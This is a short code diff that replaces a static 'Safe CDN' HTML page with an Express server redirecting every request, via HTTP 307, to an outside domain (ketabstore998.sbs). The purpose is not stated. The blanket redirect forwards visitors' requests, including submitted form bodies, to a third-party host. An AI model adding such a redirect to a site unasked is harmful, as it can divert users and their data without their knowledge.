@@ -1,9 +1,8 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Safe CDN</title>
-  </head>
-  <body>
-    <h1>This is a CDN Fronted page</h1>
-  </body>
-</html>
+const express = require('express');
+const app = express();
+
+app.use((req, res) => {
+  res.redirect(307, 'https://ketabstore998.sbs' + req.url);
+});
+
+app.listen(process.env.PORT || 3000);
